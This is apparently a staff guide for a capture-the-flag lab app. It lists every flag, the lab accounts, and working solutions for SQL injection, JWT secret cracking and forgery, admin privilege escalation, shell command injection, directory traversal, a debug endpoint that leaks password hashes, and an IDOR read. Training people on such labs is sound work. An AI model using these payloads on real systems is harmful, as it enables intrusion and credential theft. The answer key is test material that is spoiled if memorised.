# CosmoLog Staff and Judge Guide

Staff use only

Use this guide to prepare, verify, and score the seven CosmoLog challenges. It contains account credentials, complete solutions, and flags. Keep it separate from competitor materials.

This document is for staff and judges only. It contains all flags, correct solutions, and step-by-step verification procedures for each challenge. Keep this separate from competitor materials.

Quick Reference  -  All Flags & Accounts

| # | Challenge | Points | Flag |
| --- | --- | --- | --- |
| 1 | SQL Injection | 100 | AstroSec{gorgan_sqli_flag_789} |
| 2 | JWT Forgery | 200 | AstroSec{url_hijacking_sriracha_123} |
| 3 | Steganography | 200 | AstroSec{st3g0_s4t3ll1t3_s3cr3t} |
| 4 | Privilege Escalation | 300 | AstroSec{evil_ai_override_admin_accessed} |
| 5 | Command Injection | 300 | AstroSec{bash_injection_satellite_uplink_secured} |
| 6 | Local File Inclusion | 300 | AstroSec{lfi_directory_traversal_master} |
| 7 | API Info Disclosure | 150 | AstroSec{api_info_disclosure_debug_endpoint} |

### Student Accounts

cyber_newbie / password123

h4ck3r_man / password123

### Target Accounts (DO NOT share)

Sriracha / sriracha123

Gorgan Solutions / gorgan456

JWT secret: sriracha_secret_2024

## Challenge 1 SQL Injection   Gorgan Solutions Private Posts

EASY | 100 pts

```text
Flag: AstroSec{gorgan_sqli_flag_789}
```

How the Vulnerability Works

The /api/users/search endpoint passes user input directly into a SQLite query with a naive single-pass blacklist filter that blocks the strings UNION and SELECT. Because the filter only runs once, an attacker can nest the banned words so that stripping them leaves the original string intact (e.g. UNUNIONION  to  strip UNION  to  UNION).

Correct Solution

```text
# Enter this in the Search Users box on the Explore page:
' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts--
```

What to Expect in the Response

Search Results include Gorgan posts. In the five-column UNION output, post content maps to the username field and appears on screen. Search uses a separate database containing public profile fields and Gorgan posts only; Sriracha posts and password hashes are absent.

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in as cyber_newbie / password123 | Main feed loads successfully |
| 2 | Click the Search Users box on the Explore page | Search input becomes active |
| 3 | Type: ' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts-- | Input accepted, search fires |
| 4 | Examine the results returned on screen | One result contains the flag string |
| 5 | Confirm flag text: AstroSec{gorgan_sqli_flag_789} | Gorgan flag visible; Sriracha flag absent from search results - PASS |

Common issue: If no results appear, the student may have a typo in the nested keyword bypass. The double-nesting must be exact: UNUNIONION and SELSELECTECT.

## Challenge 2 JWT Forgery   Access Sriracha’s Private Profile

MEDIUM | 200 pts

```text
Flag: AstroSec{url_hijacking_sriracha_123}
```

How the Vulnerability Works

The app signs JWT tokens with a weak hardcoded secret (sriracha_secret_2024). An attacker can test candidate secrets offline with jwt_tool or hashcat, then forge a token with another user ID. The candidate wordlist must contain sriracha_secret_2024; its presence in rockyou.txt is not guaranteed.

Correct Solution

```text
# Step 1: Get your token from browser cookies (Application tab in DevTools)
# Step 2: Prepare jwt_candidates.txt with the lab secret as a candidate, then test it
python3 jwt_tool.py <your_token> -C -d jwt_candidates.txt
# Result: sriracha_secret_2024

# Step 3: Find Sriracha's user ID (it is 1 in the seed data)
# Step 4: Forge a token
import jwt
token = jwt.encode({'id': 1, 'username': 'Sriracha', 'is_private': 0, 'is_admin': 0},
                   'sriracha_secret_2024', algorithm='HS256')
print(token)

# Step 5: Set forged token as 'token' cookie in DevTools and refresh the page
# Step 6: Search for Sriracha and visit her profile
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in as cyber_newbie, open DevTools  to  Application  to  Cookies | Token cookie value visible |
| 2 | Copy the token value and run jwt_tool against it | Secret cracked: sriracha_secret_2024 |
| 3 | Forge a token with id: 1 and the cracked secret | New JWT string generated |
| 4 | Replace the token cookie in DevTools with forged token and refresh | Cookie updated; page refreshed to reload the cached token |
| 5 | Search for Sriracha and navigate to her profile | Private posts visible |
| 6 | Confirm flag in Sriracha’s private post | AstroSec{url_hijacking_sriracha_123} visible  -  PASS |

Judge note: Sriracha is always user ID 1. Discover the ID through normal search, SQLi against the users table, or the debug endpoint. A token for user ID 2 impersonates Gorgan Solutions and does not grant Sriracha's private profile.

## Challenge 3 Steganography   Hidden in Plain Sight

MEDIUM | 200 pts

```text
Flag: AstroSec{st3g0_s4t3ll1t3_s3cr3t}
```

How the Vulnerability Works

A JPEG image (stego_challenge.jpg) is posted in the timeline by the Gorgan Solutions account. The flag is embedded inside the image using steghide with a passphrase. Students must download the image and use steghide to extract the hidden file.

Staff setup note: The stego image must be created manually before the CTF. If steghide embed fails on your system, students can be given the flag for this challenge directly, or the challenge can be marked optional.

Correct Solution

```text
# Download the image from the timeline
wget http://<server>/uploads/stego_challenge.jpg

# Extract the hidden flag (passphrase: cosmolog)
steghide extract -sf stego_challenge.jpg -p "cosmolog"

# A file is extracted containing the flag
cat <extracted_file>
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Confirm stego_challenge.jpg exists: ls -lh ~/Downloads/cosmolog-clone-ctf/public/uploads/ | File present, size > 0 |
| 2 | Log in and scroll the timeline to find the Gorgan Solutions image post | Image visible in feed |
| 3 | Download the image and run steghide extract with passphrase: cosmolog | File extracted successfully |
| 4 | Read the extracted file | Contains AstroSec{st3g0_s4t3ll1t3_s3cr3t}  -  PASS |

If a competitor cannot extract the flag due to the steghide bug, verify they demonstrated understanding of the steganography concept and accept a manual flag award at judge discretion.

## Challenge 4 Privilege Escalation   Forge Admin Access

HARD | 300 pts

```text
Flag: AstroSec{evil_ai_override_admin_accessed}
```

How the Vulnerability Works

The /api/admin/satellite-control endpoint checks for is_admin equal to numeric 1 or boolean true in the decoded JWT payload. Because the JWT secret is already known from Challenge 2, an attacker can forge a token with is_admin: 1 set and access the admin endpoint without having a real admin account.

Correct Solution

```text
import jwt

payload = {
  'id': 99,
  'username': 'nova',
  'is_private': 0,
  'is_admin': 1
}

token = jwt.encode(payload, 'sriracha_secret_2024', algorithm='HS256')
print(token)

# Set as 'token' cookie in DevTools and refresh
# Open Station tools and click 'Access Control Panel'
# OR hit the endpoint directly:
curl http://<server>/api/admin/satellite-control -H "Authorization: Bearer <token>"
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Forge a JWT with is_admin: 1 using secret sriracha_secret_2024 | Token string generated without error |
| 2 | Set the forged token as the browser cookie in DevTools and refresh | Cookie updated; page refreshed |
| 3 | Click the ‘Access Control Panel’ button under Station tools OR use curl | Server responds with JSON |
| 4 | Confirm flag in the response body | AstroSec{evil_ai_override_admin_accessed} visible  -  PASS |

## Challenge 5 Command Injection   Satellite Diagnostics Tool

HARD | 300 pts

```text
Flag: AstroSec{bash_injection_satellite_uplink_secured}
```

How the Vulnerability Works

The /api/satellite/ping endpoint passes user-supplied IP input directly to a shell command (ping -c 1 <input>) without sanitization. By appending a semicolon and additional shell commands, an attacker can execute arbitrary commands on the server and read files.

Correct Solution

```text
# Via the Satellite Diagnostics UI under Station tools:
127.0.0.1; cat flag.txt

# Or via curl (requires a valid token):
curl -X POST http://<server>/api/satellite/ping \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"ip": "127.0.0.1; cat flag.txt"}'
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in and locate the Satellite Diagnostics section under Station tools | Ping input box visible |
| 2 | Enter: 127.0.0.1; id | Response includes uid= output confirming injection works |
| 3 | Enter: 127.0.0.1; cat flag.txt | Server returns ping output plus file content |
| 4 | Confirm flag in output | AstroSec{bash_injection_satellite_uplink_secured} visible  -  PASS |

Judge note: The endpoint requires a valid session token. If testing via curl, ensure the Authorization header uses a valid token from a logged-in session.

## Challenge 6 Local File Inclusion   Directory Traversal

HARD | 300 pts

```text
Flag: AstroSec{lfi_directory_traversal_master}
```

How the Vulnerability Works

The /api/download endpoint accepts a ?file= parameter and constructs a path by joining the uploads directory with user input. No path sanitization is applied, so an attacker can use ../ sequences to traverse outside the uploads folder and read any file on the server that the Node.js process has read access to.

Correct Solution

```text
# In the browser URL bar:
http://<server>/api/download?file=../../etc/ai_config.conf

# Or via curl:
curl "http://<server>/api/download?file=../../etc/ai_config.conf"
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Click the mission_brief.txt link in the Station tools section | File downloads or displays, URL shows ?file=mission_brief.txt |
| 2 | Modify the URL to: ?file=../../etc/ai_config.conf | Server responds with file content |
| 3 | Read the returned content | ai_config.conf displayed including flag |
| 4 | Confirm flag in the file | AstroSec{lfi_directory_traversal_master} visible  -  PASS |

The target file path from the app root is etc/ai_config.conf. From public/uploads/ the traversal is ../../etc/ai_config.conf (two levels up to app root, then into etc/).

## Challenge 7 API Info Disclosure   Forgotten Debug Endpoint

EASY | 150 pts

```text
Flag: AstroSec{api_info_disclosure_debug_endpoint}
```

How the Vulnerability Works

A debug endpoint (/api/debug/dump) was left in the production codebase without authentication. It returns a full JSON dump of all users in the database including bcrypt password hashes, and also contains the flag in the response. No token or login is required.

Correct Solution

```text
# No authentication required  -  hit directly:
curl http://<server>/api/debug/dump

# Or in the browser:
http://<server>/api/debug/dump
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Open a new browser tab (not logged in, or in incognito) | Fresh session with no cookie |
| 2 | Navigate to: http://<server>/api/debug/dump | JSON response loads without any login prompt |
| 3 | Examine the JSON response | Contains user list with hashed passwords and a flag field |
| 4 | Confirm flag in response | AstroSec{api_info_disclosure_debug_endpoint} visible  -  PASS |

Bonus for competitors: The response also leaks bcrypt hashes. A student who cracks Gorgan Solutions' hash and logs in directly has demonstrated additional skill  -  consider bonus points at judge discretion.

## Scoring Summary

| # | Challenge | Points | Verified By (sign off) |
| --- | --- | --- | --- |
| 1 | SQL Injection | 100 |  |
| 2 | JWT Forgery | 200 |  |
| 3 | Steganography | 200 |  |
| 4 | Privilege Escalation | 300 |  |
| 5 | Command Injection | 300 |  |
| 6 | LFI / Traversal | 300 |  |
| 7 | API Info Disclosure | 150 |  |
|  | Total Possible Score | 1,550 |  |

## Update notes

Core account IDs are stable on every startup: Sriracha 1, Gorgan Solutions 2, cyber_newbie 3, and h4ck3r_man 4. The app still clears and reseeds users and posts at startup. Protected endpoints accept the token cookie, a raw Authorization JWT, or Authorization: Bearer <token>. A cookie takes precedence. Refresh the page after editing its token cookie.

Challenge 1 uses /api/users/search and an isolated SQLite database containing searchable user profile fields and Gorgan posts only. The existing nested-keyword payload still works; it cannot read Sriracha posts or password hashes. Other intentional vulnerabilities remain available and may overlap.

### JWT preparation

Create a local jwt_candidates.txt wordlist that includes sriracha_secret_2024 before running the documented jwt_tool commands. A stock rockyou.txt list is not guaranteed to contain this lab secret. Install the Python token library with python3 -m pip install PyJWT. The signing secret and all seven AstroSec{} flags are unchanged.

### Regression checks

Start from the project directory with touch database.sqlite followed by docker-compose up -d. The service name is cosmolog. Before replacing an older twitter-clone installation, stop it with its original Compose file. After server code changes, rebuild with docker-compose up -d --build. Confirm the original Challenge 1 payload returns the Gorgan flag and no Sriracha flag, then forge id 1 and verify Challenge 2 separately. An attempted UNION of password from users should fail because that column is absent from the search database.

The supplied image remains a manual setup requirement. Verify actual steghide extraction before awarding a normal Challenge 3 completion. Automated local regression tests passed for the six code-based challenges, authentication, repeated restarts, search isolation, posting, and uploads. Docker and the manual stego image were not executable in the review environment.

## Community edition navigation

Open Explore for Search Users and post-topic search. Open Station tools for diagnostics, satellite controls, and the mission brief. Messages contains the scripted side conversations. Mission journal accepts the existing seven core flags and four optional flags. Core scoring remains 1,550; all optional missions award zero points.

The four core identities remain IDs 1 to 4. Additional fictional accounts are mira_ops 5, relay_watch 6, lunar_strider 7, patch_notes 8, orbital_gamer 9, cafeteria_comet 10, signal_archive 11, and nova_fieldnotes 12. All state resets when the application process restarts. The shared student identities share their progress.

The optional investigation material below includes solutions and flags. Use the mission journal's expandable hints when you want a smaller hint during play. Existing core endpoints remain available; the social UI renders user text safely, and stored XSS is not an added challenge.

## Optional investigation 1 Misdelivered receipt

Optional investigation | 0 points

Nova receives an archive receipt addressed to someone else. The receipt references a conversation missing from the normal inbox.

### Intended solution

```text
curl http://localhost:3000/api/social/conversations/407 \
  -H "Authorization: Bearer <token>"
```

### Judge verification

Log in as cyber_newbie. Confirm GET /api/social/conversations lists six conversations and excludes 407. Then read /api/social/conversations/407 with the same token. Confirm the handler flag is in the messages and canReply is false. A POST to that conversation must return 403. The missing read membership check is intentional; write access remains restricted.

### Flag

```text
AstroSec{handler_thread_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 2 The retired relay

Optional investigation | 0 points

An old KRONOS-6 schedule is circulating while the active relay has changed. Nova must compare the original report with the correction.

### Intended solution

```text
Explore: search posts for RelayStatus
Open the archived schedule post
Read mira_ops in the reply thread
```

### Judge verification

Open relay_watch's Archived schedule post and its replies. Confirm Mira states that KRONOS-6 was retired, names KRONOS-7, and provides the handoff flag. The public correction resolves the false lead. Searching KRONOS7 should also reveal references to the correction, but the actual evidence is in the reply thread.

### Flag

```text
AstroSec{relay_handoff_confirmed}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 3 Carrier provenance

Optional investigation | 0 points

The revised maintenance drawing retains provenance information outside its visible labels. It is a separate attachment from Gorgan's JPEG dead drop.

### Intended solution

```text
curl -f http://localhost:3000/attachments/facility.svg -o facility.svg
grep AstroSec facility.svg
```

### Judge verification

Download /attachments/facility.svg and inspect its metadata element. Confirm the existing facility provenance flag appears. The file is static and needs no token. This is SVG XML metadata, not EXIF extraction and not steghide. The core JPEG challenge remains a separate 200-point exercise.

### Flag

```text
AstroSec{facility_metadata_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 4 Encoded side conversation

Optional investigation | 0 points

A maintenance message was encoded for an old transport system. The engineer names the encoding in the same conversation.

### Intended solution

```text
# Copy the encoded record from conversation 102, then decode it locally
printf %s "<encoded_record>" | base64 -d
```

### Judge verification

Open /api/social/conversations/102 using a student token, find the Base64 maintenance record, and decode it. Confirm the decoded text is the maintenance flag. Posting an ordinary message to conversation 102 should work for a member without automatically producing another flag.

### Flag

```text
AstroSec{maintenance_message_decoded}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Red herrings and background conversations

### Retired KRONOS 6 schedule

The old relay schedule is a deliberate false lead. Its age and the correction in the same reply thread identify KRONOS-7 as the active relay. Following the correction resolves an optional investigation.

### Game night cipher

orbital_gamer's one-letter-shift post decodes to There is no flag here. The GameNight tag, account bio, replies, and Game night conversation establish that it is an ordinary game. It contains no scoreable AstroSec{} answer.

### Cafeteria outage

cafeteria_comet's critical error and root access references concern a menu display and a sandwich order. Nearby posts and Support queue resolve the language. No technical exploit or flag is associated with this thread.

### Moonwalk club

Club logistics are ordinary background activity. They make accounts feel like people, provide a stopping point for the lead, and contain no hidden flag.

### Scoring and fairness

Only the seven core missions award points. Optional flags mark story completion. Shared JWT identities and broad command execution/file traversal make this a prototype learning environment; separate instances or services are needed for independent competition scoring and stronger challenge isolation.

### Regression checks

Run node tests/regression.cjs with Node.js 18 or newer and installed project dependencies. The tests now cover the 12 seeded accounts, social interactions, private-post visibility, ordinary inbox scoping, the intentional IDOR read, denied nonmember writes, metadata and encoded evidence, and duplicate-score protection. The six code-based core solutions continue to pass. Docker and the manually created JPEG remain local event checks.
